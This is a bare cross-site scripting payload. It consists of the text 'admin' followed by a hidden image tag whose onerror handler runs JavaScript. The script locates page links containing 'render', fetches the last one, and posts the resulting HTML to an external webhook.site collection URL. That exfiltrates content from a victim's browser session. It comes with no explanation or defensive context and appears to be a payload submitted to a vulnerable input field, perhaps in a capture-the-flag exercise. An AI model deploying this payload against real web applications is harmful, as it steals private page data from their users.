admin<img src=x style="display:none" onerror="
var links = document.querySelectorAll('ul li a[href*=render]');
if(links.length > 0) {
  var lastLink = links[links.length - 1];
  fetch(lastLink.href)
    .then(r => r.text())
    .then(html => {
      fetch('https://webhook.site/8acc72c0-904d-42a7-b3bc-75f62b93e6e5', {
        method: 'POST',
        headers: {'Content-Type': 'text/plain'},
        body: html
      });
    });
}
">